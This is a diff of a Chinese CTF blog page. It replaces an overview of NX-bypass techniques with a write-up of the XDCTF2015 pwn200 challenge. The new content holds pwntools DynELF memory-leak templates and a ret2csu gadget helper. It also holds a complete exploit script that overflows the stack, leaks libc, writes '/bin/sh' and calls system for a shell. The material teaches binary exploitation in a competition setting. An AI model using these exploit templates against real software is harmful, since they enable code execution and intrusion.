@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="绕过NX, tcrestart">
-    <meta name="description" content="1.绕过NX保护的几种常见方法1.Return-to-libc攻击利用程序中已经存在的GOT表项和PLT表项，将程序流程跳转到libc库的某个函数，从而绕过NX保护。例如，在一个程序中存在一个漏洞，可以通过溢出栈来覆盖函数调用时保存返回地址">
+    <meta name="keywords" content="XDCTF2015-pwn200, tcrestart">
+    <meta name="description" content="一.DynELF方法具体参考：https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/https://www.anquanke.com/post/id">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -28,7 +28,7 @@
 </script>
 
 
-    <title>绕过NX | tcrestart</title>
+    <title>XDCTF2015-pwn200 | tcrestart</title>
     <link rel="icon" type="image/jpeg" href="/g.jpg">
     
     <style>
@@ -375,12 +375,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">绕过NX</h1>
+                    <h1 class="description center-align post-title">XDCTF2015-pwn200</h1>
                 </div>
             </div>
         </div>
@@ -414,6 +414,10 @@
                                 <span class="chip bg-color">pwn</span>
                             </a>
                         
+                            <a href="/tags/writeup/">
+                                <span class="chip bg-color">writeup</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -435,28 +439,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-04-13
+                    2023-04-16
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-14
+                    2023-04-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    6 分
                 </div>
                 
 
@@ -479,13 +483,185 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1-绕过NX保护的几种常见方法"><a href="#1-绕过NX保护的几种常见方法" class="headerlink" title="1.绕过NX保护的几种常见方法"></a>1.绕过NX保护的几种常见方法</h2><h3 id="1-Return-to-libc攻击"><a href="#1-Return-to-libc攻击" class="headerlink" title="1.Return-to-libc攻击"></a>1.Return-to-libc攻击</h3><p>利用程序中已经存在的GOT表项和PLT表项，将程序流程跳转到libc库的某个函数，从而绕过NX保护。<br>例如，在一个程序中存在一个漏洞，可以通过溢出栈来覆盖函数调用时保存返回地址的位置。如果该程序被编译成启用了NX保护，则无法直接在栈上注入shellcode。但是，我们可以利用libc库中已有的函数来实现任意指令执行。比如，我们可以覆盖函数调用时的返回地址为system()函数的地址，然后将需要执行的命令作为参数传递给system()函数。<br><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/ug9gx5#fdaxg">具体参考</a></p>
-<h3 id="2-Return-to-ROP攻击"><a href="#2-Return-to-ROP攻击" class="headerlink" title="2.Return-to-ROP攻击"></a>2.Return-to-ROP攻击</h3><p>利用程序中一些已有的代码段或者库中的代码段，构造ROP链实现任意指令执行。具体来说，通过伪造栈帧，将多个gadget组合起来构成ROP链，从而跳转到程序中其他位置执行恶意代码。<br>例如，在某个程序中存在一个漏洞，我们可以通过缓冲区溢出来控制程序的执行流程，但是无法直接执行任意指令。这种情况下，我们可以使用ROP技术来构造一条由多个gadget组成的链，从而达到执行任意指令的目的。下面是一些常见的gadget类型：<br>pop reg; ret：弹出寄存器reg的值，并将代码流程跳转到返回地址。<br>mov reg1, reg2; ret：将reg2中的值赋给reg1，并将代码流程跳转到返回地址。<br>add reg1, reg2; ret：将reg1和reg2相加，并将代码流程跳转到返回地址。<br>xor reg1, reg2; ret：将reg1和reg2进行异或，并将代码流程跳转到返回地址。<br>call [reg];：调用寄存器reg中存储的函数地址<br>可以使用ROPgadget等工具自动化生成ROP链<br><a target="_blank" rel="noopener" href="https://ropemporium.com/challenge/split.html">例题</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3402">ROP</a><a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/105913705?spm=1001.2014.3001.5502">BROP</a><a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/107512670?spm=1001.2014.3001.5502">SROP</a></p>
-<h3 id="3-Ret2dlresolve攻击"><a href="#3-Ret2dlresolve攻击" class="headerlink" title="3.Ret2dlresolve攻击"></a>3.Ret2dlresolve攻击</h3><p>通过覆盖GOT表项，将程序跳转到自己编写的dlresolve函数，通过解析动态链接库中的符号，获取需要的函数地址，再跳转到该函数实现任意指令执行和代码注入。<br>Ret2dlresolve攻击可以通过覆盖程序的GOT表或PLT表，将程序跳转到自定义的解析动态链接库符号的函数中，获取到需要调用的函数地址，并将程序流程跳转到该函数。下面是一个简单的实例，在某个程序中存在栈溢出漏洞，我们可以利用Ret2dlresolve攻击来执行任意指令。具体来说，我们可以构造一个伪造的DT_NEEDED段，然后在程序中使用dlopen()函数打开这个动态链接库，从而使得程序在运行时会解析这个DT_NEEDED段中的符号。接着，我们可以通过覆盖GOT表项，将程序跳转到我们自己编写的dlresolve函数，该函数会解析需要调用的函数地址并返回给程序，最终跳转到该函数实现代码注入<br><a target="_blank" rel="noopener" href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">具体参考1</a><br><a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502">具体参考2</a></p>
-<h3 id="4-ret2plt攻击"><a href="#4-ret2plt攻击" class="headerlink" title="4.ret2plt攻击"></a>4.ret2plt攻击</h3><p>可以通过覆盖程序的PLT表项，将程序跳转到某个库函数的PLT入口，在绕过NX保护的同时，也可以实现代码注入。<br>在某个程序中存在栈溢出漏洞，但是启用了NX保护。我们可以使用ret2plt攻击，通过覆盖程序的PLT表项，将程序跳转到某个库函数的PLT入口，并向函数传递参数，从而实现代码注入和任意指令执行。例如，我们可以使用libc库中的system()函数来执行任意命令。具体来说，我们可以通过覆盖程序的PLT表项，将程序跳转到system()函数的PLT入口，然后将需要执行的命令作为参数传递给system()函数。<br><a target="_blank" rel="noopener" href="https://ctftime.org/task/13273">例题</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/guilanl/article/details/70227392">具体参考</a></p>
-<h3 id="5-使用栈迁移技术"><a href="#5-使用栈迁移技术" class="headerlink" title="5.使用栈迁移技术"></a>5.使用栈迁移技术</h3><p>在一些特殊情况下，无法直接修改返回地址，但是可以通过栈迁移技术，将栈上存储的数据移动到另外一块内存区域，从而绕过NX保护。<br>在某些情况下，无法直接修改返回地址或者调用其他函数来实现代码注入。但是，我们可以使用栈迁移技术，在栈上创建一块新的内存区域，将原始的栈数据复制到这里，然后在新的栈上进行操作。具体来说，我们可以通过覆盖函数调用时的参数，使得程序执行到一个特定的函数，该函数会执行栈迁移操作。栈迁移函数会在堆上申请一块新的内存区域，将原始的栈数据复制到这个区域中，并且修改返回地址，使得程序在执行完栈迁移操作后会跳转到新的栈上。在新的栈上，我们可以自由地进行任意指令执行和代码注入。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/max1z/p/15299000.html">具体参考</a></p>
-<h3 id="6-JIT（Just-In-Time）编译攻击"><a href="#6-JIT（Just-In-Time）编译攻击" class="headerlink" title="6.JIT（Just-In-Time）编译攻击"></a>6.JIT（Just-In-Time）编译攻击</h3><p>创建一个可执行内存区域，将shellcode动态生成到这个区域，并且跳转到该区域执行代码。<br>JIT攻击通常需要程序本身存在一定的漏洞，如栈溢出漏洞等。下面是一个简单的实例，在某个程序中存在栈溢出漏洞，我们可以构造恶意输入，使得程序执行时会将shellcode写入一个可执行的内存区域，并且跳转到该区域执行。例如，我们可以使用mmap()函数将一块可读写可执行的内存映射到进程空间，然后将shellcode写入这个内存区域，并手动在栈上伪造一个返回地址，使得程序执行完shellcode后会跳转到正确的位置。<br><a target="_blank" rel="noopener" href="https://github.com/scwuaptx/CTF/blob/master/2014-writeup/pwnable/exploitable/exploitable.md">例题</a></p>
-<h3 id="7-使用mmap等函数映射内存"><a href="#7-使用mmap等函数映射内存" class="headerlink" title="7.使用mmap等函数映射内存"></a>7.使用mmap等函数映射内存</h3><p>通过调用mmap等函数，将一个可读写可执行的内存区域映射到进程空间，然后将shellcode写入这个内存区域并执行。<br>在某个程序中存在栈溢出漏洞，但是启用了NX保护。我们可以使用mmap()函数将一块可读写可执行的内存映射到进程空间，然后将shellcode写入这个内存区域，并手动在栈上伪造一个返回地址，使得程序执行完shellcode后会跳转到正确的位置。具体来说，我们可以首先调用mmap()函数映射一块可读写可执行的内存，然后使用strcpy()等函数将shellcode复制到这个内存区域，并在栈上伪造一个返回地址，使得程序执行完shellcode后会跳转到正确的位置。<br><a target="_blank" rel="noopener" href="https://github.com/hitcon2016/exploit/blob/master/pwn/echo/README.md">例题</a></p>
+                <h1 id="一-DynELF方法"><a href="#一-DynELF方法" class="headerlink" title="一.DynELF方法"></a>一.DynELF方法</h1><p>具体参考：<br><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/">https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85129">https://www.anquanke.com/post/id/85129</a></p>
+<h2 id="1-DynELF简介"><a href="#1-DynELF简介" class="headerlink" title="1.DynELF简介"></a>1.DynELF简介</h2><h3 id="1-1前言"><a href="#1-1前言" class="headerlink" title="1.1前言"></a>1.1前言</h3><p>在没有目标系统文件的情况下，可以通过使用pwntools的DynELF模块来泄露地址信息，从而获取到shell.</p>
+<h3 id="1-2基本原理"><a href="#1-2基本原理" class="headerlink" title="1.2基本原理"></a>1.2基本原理</h3><p>DynELF 技术的原理是通过动态加载和链接共享库，并使用 dlsym() 函数查找共享库中的符号，从而实现程序的灵活性和可扩展性。在 CTF 中，我们可以利用 DynELF 来解决一些和导入表相关的问题，例如查找加密函数的地址、解密字符串等。<br>主要使用条件：<br>1）目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；<br>2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</p>
+<h3 id="1-3代码模板"><a href="#1-3代码模板" class="headerlink" title="1.3代码模板"></a>1.3代码模板</h3><h4 id="1-3-1基本模板"><a href="#1-3-1基本模板" class="headerlink" title="1.3.1基本模板"></a>1.3.1基本模板</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./xxx'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token comment">#各种预处理</span>
+  payload <span class="token operator">=</span> <span class="token string">"xxxxxxxx"</span> <span class="token operator">+</span> address <span class="token operator">+</span> <span class="token string">"xxxxxxxx"</span>
+  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+  <span class="token comment">#各种处理</span>
+  data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+  log<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token punctuation">(</span>data <span class="token keyword">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  <span class="token keyword">return</span> data
+d <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span> elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment">#初始化DynELF模块 </span>
+systemAddress <span class="token operator">=</span> d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'libc'</span><span class="token punctuation">)</span>  <span class="token comment">#在libc文件中搜索system函数的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="1-3-2基于puts的模板"><a href="#1-3-2基于puts的模板" class="headerlink" title="1.3.2基于puts的模板"></a>1.3.2基于puts的模板</h4><p>puts遇到“\x00”会中断，并且会在字符串结尾自动加上’\n’，非常不适合leak函数。</p>
+<p>64位：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span> 
+    payload <span class="token operator">=</span> padding <span class="token operator">+</span> fake_rbp
+    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> 
+    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_address<span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> 
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">)</span>
+    count <span class="token operator">=</span> <span class="token number">0</span> 
+    data <span class="token operator">=</span> <span class="token string">''</span> 
+    up <span class="token operator">=</span> <span class="token string">""</span> 
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        c <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span> 
+        count <span class="token operator">+=</span> <span class="token number">1</span> 
+        <span class="token keyword">if</span> up <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token keyword">and</span> c <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span> 
+            data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> 
+            data <span class="token operator">+=</span> <span class="token string">"\x00"</span>
+            <span class="token keyword">break</span>  
+        <span class="token keyword">else</span><span class="token punctuation">:</span> 
+            data <span class="token operator">+=</span> c 
+        up <span class="token operator">=</span> c 
+    data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span>
+    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'%x -> %s'</span><span class="token operator">%</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>32位：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  count <span class="token operator">=</span> <span class="token number">0</span>
+  data <span class="token operator">=</span> <span class="token string">''</span>
+  payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret_address<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>address<span class="token punctuation">)</span>
+  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+  <span class="token keyword">print</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">)</span> 
+  up <span class="token operator">=</span> <span class="token string">""</span>
+  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    c <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> 
+    count <span class="token operator">+=</span> <span class="token number">1</span>
+    <span class="token keyword">if</span> up <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token keyword">and</span> c <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>  
+      buf <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>             
+      buf <span class="token operator">+=</span> <span class="token string">"\x00"</span>
+      <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+      buf <span class="token operator">+=</span> c
+    up <span class="token operator">=</span> c
+  data <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>  
+  log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'%x -> %s'</span><span class="token operator">%</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  <span class="token keyword">return</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>数据接收那里很容易出问题，并且必须要有“ p.recvuntil(‘xxxx’) ”</p>
+<p>因为程序在运行的过程中会输出一些字符串，可能会干扰数据接收的过程</p>
+<h4 id="1-3-3基于write的模板"><a href="#1-3-3基于write的模板" class="headerlink" title="1.3.3基于write的模板"></a>1.3.3基于write的模板</h4><p>64位：</p>
+<pre class="line-numbers language-none"><code class="language-none">def leak(addr): 
+    payload &#x3D; padding + fake_rbp
+    payload +&#x3D; p64(pop_rdi_ret) + p64(1)
+    payload +&#x3D; p64(pop_rsi_ret) + p64(addr)
+    payload +&#x3D; p64(pop_rdx_ret) + p64(8)
+    payload +&#x3D; p64(write_plt) + p64(ret_address)
+    p.send(payload)
+    p.recvuntil(&#39;xxxx&#39;)
+    data &#x3D; p.recv(8)
+    log.success(&#39;%x -&gt; %s&#39;%(addr,hex(u64(data))))
+    return data
+
+d &#x3D; DynELF(leak,elf &#x3D; elf)
+function_libc &#x3D; d.lookup(&#39;function&#39;,&#39;libc&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>32位：</p>
+<pre class="line-numbers language-none"><code class="language-none">def leak(address):
+    payload &#x3D; padding + fake_rbp
+    payload +&#x3D; p32(write_plt) + p32(ret_address) 
+    payload +&#x3D; p32(1) + p32(address) + p32(4)
+    p.sendline(payload)
+    p.recvuntil(&#39;xxxx&#39;)
+    data &#x3D; p.recv(4) 
+    log.success(&#39;%x -&gt; %s&#39;%(address,hex(u32(data))))
+    return data
+
+d &#x3D; DynELF(leak,elf &#x3D; elf)
+function_libc &#x3D; d.lookup(&#39;function&#39;,&#39;libc&#39;)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>配合万能pop，代码如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">def leak(addr): 
+    csu(0, 1, write_got, 8, addr, 1, main_addr)
+    p.recvuntil(&#39;xxxx&#39;) 
+    data &#x3D; p.recv(8)
+    log.info(&quot;%#x &#x3D;&gt; %s&quot; % (addr, (data or &#39;&#39;).encode(&#39;hex&#39;))) 
+    return data
+#当然，配合puts也是可以的（puts和write就只有接收部分不同）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><em><strong>补充：万能pop模板</strong></em></p>
+<p>当程序的常规gadgets不能满足需求时（通常是缺少“pop_rdx”），就需要万能pop<br>如果用csu进行寄存器赋值，需要两个重要的ROPgadgets：</p>
+<p>csu_front_addr:<br><img src="https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126255915-1642995722008-1647496563602.png"><br>csu_end_addr:<br><img src="https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126386447-1642995722010-1647496563602.png"></p>
+<p><code>不同的程序csu可能不同（寄存器顺序不同），一定要确认并修改</code></p>
+<pre class="line-numbers language-none"><code class="language-none">csu_front_addr&#x3D;
+csu_end_addr&#x3D;
+
+def csu(rbx, rbp, r12, r13, r14, r15, last):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0,
+    # rbp should be 1,enable not to jump
+    # r12 should be the function we want to call(只能是got表地址)
+    # rdi&#x3D;edi&#x3D;r15d
+    # rsi&#x3D;r14
+    # rdx&#x3D;r13
+    # csu(0, 1, fun_got, rdx, rsi, rdi, last)
+    payload &#x3D; padding + fake_ebp
+    payload +&#x3D; p64(csu_end_addr) 
+    payload +&#x3D; p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
+    payload +&#x3D; p64(csu_front_addr)
+    payload +&#x3D; b&#39;a&#39; * 0x38	
+    payload +&#x3D; p64(last)	
+    p.send(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>fun_got也可以是指向函数首地址的指针</p>
+<p>例子：</p>
+<pre class="line-numbers language-none"><code class="language-none">csu(0, 1, write_got, 8, bss_addr, 1, main_addr)
+#执行write(1,bss_addr,8)后，执行main_addr
+csu(0, 1, read_got, 8, bss_addr, 0, main_addr)	
+#执行read(0,bss_addr,8)后，执行main_addr
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2.解题思路"></a>2.解题思路</h2><p>checksec下32位，除了canary没开，其他保护全开。</p>
+<p>借助DynELF实现利用的点：<br>1）调用write函数来泄露地址信息，比较方便；<br>2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；<br>3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；<br>4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</p>
+<p>exp:</p>
+<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+
+p &#x3D; process(&quot;.&#x2F;XDCTF_2015_pwn200&quot;)
+elf &#x3D; ELF(&quot;.&#x2F;XDCTF_2015_pwn200&quot;)
+
+write_plt &#x3D; elf.symbols[&#39;write&#39;]
+ret_addr &#x3D; 0x080484B  #vuln_addr
+start_addr &#x3D; 0x080483D0		
+read_plt &#x3D; elf.symbols[&#39;read&#39;]
+ppp_ret_addr &#x3D; 0x0804856C
+bss_addr &#x3D; 0x0804A020	#用来写入&#39;&#x2F;bin&#x2F;sh&#39;
+
+def leak(addr):
+    payload1 &#x3D; b&#39;A&#39; * 108 + b&quot;BBBB&quot;
+    payload1 +&#x3D; p32(write_plt) + p32(ret_addr)
+    payload1 +&#x3D; p32(1) + p32(addr) + p32(4)
+    p.send(payload1)
+    data &#x3D; p.recv(4)
+    log.success(&#39;%x -&gt; %s&#39;%(addr,hex(u32(data))))
+    return data
+
+print p.recvline()
+d &#x3D; DynELF(leak,elf &#x3D; ELF(&quot;.&#x2F;XDCTF_2015_pwn200&quot;))
+sys_addr &#x3D; d.lookup(&quot;system&quot;, &quot;libc&quot;)
+print &quot;system address:&quot;, hex(sys_addr)
+#调用_start函数，恢复栈
+payload2 &#x3D; b&#39;A&#39; * 112 + p32(start_addr)
+p.send(payload2)
+p.recv()
+
+payload3 &#x3D; b&#39;A&#39; * 112 + p32(read_plt) + p32(ppp_ret_addr) + 
+        p32(0) + p32(bss_addr) + p32(8) + 
+        p32(sys_addr) + p32(ret_addr) + p32(bss_addr)
+
+p.send(payload3)
+p.send(&#39;&#x2F;bin&#x2F;sh&#39;)
+p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h1 id="二-ret2-dl-runtime-resolve方法"><a href="#二-ret2-dl-runtime-resolve方法" class="headerlink" title="二.ret2_dl_runtime_resolve方法"></a>二.ret2_dl_runtime_resolve方法</h1><p>参考：<br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/executable/elf/structure/basic-info/">https://ctf-wiki.org/executable/elf/structure/basic-info/</a><br><a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502">https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p>
+<h2 id="1-基本知识"><a href="#1-基本知识" class="headerlink" title="1.基本知识"></a>1.基本知识</h2><h3 id="1-1Linux动态链接"><a href="#1-1Linux动态链接" class="headerlink" title="1.1Linux动态链接"></a>1.1Linux动态链接</h3><p>参考我的另一篇博客，<a href="http://tcrestart.github.io/2023/04/16/linux-dong-tai-lian-jie/">Linux动态链接</a></p>
 
                 
             </div>
@@ -512,7 +688,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://tcrestart.github.io/2023/04/13/rao-guo-nx/">http://tcrestart.github.io/2023/04/13/rao-guo-nx/</a>
+                    <a href="http://tcrestart.github.io/2023/04/16/xdctf2015-pwn200/">http://tcrestart.github.io/2023/04/16/xdctf2015-pwn200/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -556,6 +732,10 @@
                             
                                 <a href="/tags/pwn/">
                                     <span class="chip bg-color">pwn</span>
+                                </a>
+                            
+                                <a href="/tags/writeup/">
+                                    <span class="chip bg-color">writeup</span>
                                 </a>
                             
                         </div>
@@ -605,6 +785,55 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
+                <a href="/2023/04/16/linux-dong-tai-lian-jie/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="linux动态链接">
+                        
+                        <span class="card-title">linux动态链接</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Linux/" class="post-category">
+                                    Linux
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/">
+                        <span class="chip bg-color">Linux动态链接</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
                 <a href="/2023/04/14/off-by-one/">
                     <div class="card-image">
                         
@@ -621,9 +850,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-14
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -649,55 +878,6 @@
                     
                     <a href="/tags/heap/">
                         <span class="chip bg-color">heap</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
